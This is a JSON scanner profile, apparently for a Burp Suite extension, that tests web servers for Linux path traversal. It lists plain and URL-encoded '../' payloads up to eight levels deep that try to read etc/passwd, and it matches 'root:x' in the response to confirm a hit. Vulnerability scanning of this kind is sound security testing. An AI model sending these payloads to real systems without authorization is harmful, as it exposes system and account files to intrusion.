[{"Name":"Linux-PathTraversal-MR","Active":true,"Scanner":1,"Author":"@egarme","Payloads":["/../{FILE}","/../../{FILE}","/../../../{FILE}","/../../../../{FILE}","/../../../../../{FILE}","/../../../../../../{FILE}","/../../../../../../../{FILE}","/../../../../../../../../{FILE}","/..%2f{FILE}","/..%2f..%2f{FILE}","/..%2f..%2f..%2f{FILE}","/..%2f..%2f..%2f..%2f{FILE}","/..%2f..%2f..%2f..%2f..%2f{FILE}","/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}","/..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}","/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["root:x"],"Tags":["All"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"MatchType":1,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"Linux-PathTraversal","IssueSeverity":"Medium","IssueConfidence":"Certain","IssueDetail":"Path traversal with payloads: \u003cbr\u003e \u003cpayload\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[{"type":"Payload","match":"{FILE}","replace":"etc/passwd","regex":"String","comment":"Generic comment"}],"VariationAttributes":[],"InsertionPointType":[65],"pathDiscovery":false}]